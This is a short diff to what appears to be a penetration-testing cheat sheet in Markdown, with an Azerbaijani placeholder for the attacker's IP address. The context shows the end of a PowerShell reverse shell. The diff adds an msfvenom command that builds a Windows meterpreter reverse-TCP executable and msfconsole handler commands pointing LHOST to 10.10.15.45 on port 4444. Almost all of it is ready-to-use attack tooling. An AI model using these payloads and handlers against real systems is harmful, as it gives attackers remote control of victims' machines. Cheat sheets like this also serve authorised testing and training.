@@ -14,11 +14,18 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
 $client.Close()
 ```
 
-# MSFVENOM
+# MSFVENOM Windows 
 ```powershell
 msfvenom -p windows/x64/meterpreter_reverse_tcp \
   LHOST=<SƏNİN_IP_ÜNVANIN> \
   LPORT=4444 \
   -f exe \
   -o reverse_x64.exe
+
+msfconsole -q
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 10.10.15.45
+set LPORT 4444
+exploit
 ```
